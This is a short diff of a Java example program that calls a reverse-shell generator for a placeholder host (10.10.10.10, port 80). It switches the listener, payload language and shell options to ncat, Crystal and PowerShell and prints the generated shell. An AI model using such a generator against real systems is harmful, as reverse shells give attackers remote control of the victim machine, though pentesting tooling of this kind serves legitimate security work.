@@ -8,9 +8,9 @@ public class App {
     public static void main(String[] args) throws Exception {
         ReverseShell shell = ReverseShell.getShellInstance("10.10.10.10",
                                                             80, 
-                                                            LISTENER.SOCAT_TTY,
-                                                            REVERSE_TYPE.VLANG,
-                                                            SHELLS.KSH);
+                                                            LISTENER.NCAT_EXE,
+                                                            REVERSE_TYPE.CRYSTAL_CODE,
+                                                            SHELLS.POWERSHELL);
 
         System.out.println(shell);
 
